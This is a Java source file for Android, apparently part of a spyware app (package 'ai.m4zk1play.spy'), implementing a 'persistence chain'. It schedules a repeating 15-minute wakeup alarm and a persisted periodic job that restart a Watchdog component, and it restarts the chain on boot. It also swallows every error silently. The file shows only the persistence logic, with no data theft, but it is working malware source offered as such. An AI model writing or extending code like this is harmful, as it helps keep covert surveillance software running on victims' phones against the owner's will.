package ai.m4zk1play.spy;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;

/** Rantai persistence: alarm + job + service. */
public final class Persist {

    private static final int JOB = 0x4d5a;

    public static void arm(Context c) {
        alarm(c);
        job(c);
    }

    private static void alarm(Context c) {
        try {
            AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(c, Watchdog.class);
            i.setAction(Watchdog.ACTION_TICK);
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(c, 1, i, flags);
            am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 60_000L, 15 * 60_000L, pi);
        } catch (Exception ignored) {
        }
    }

    private static void job(Context c) {
        if (Build.VERSION.SDK_INT < 21) return;
        try {
            JobScheduler js = (JobScheduler) c.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            JobInfo.Builder b = new JobInfo.Builder(JOB,
                    new ComponentName(c, Watchdog.class))
                    .setPersisted(true)
                    .setPeriodic(15 * 60_000L)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            js.schedule(b.build());
        } catch (Exception ignored) {
        }
    }

    public static void boot(Context c) {
        BootProvider.start(c);
        arm(c);
    }
}
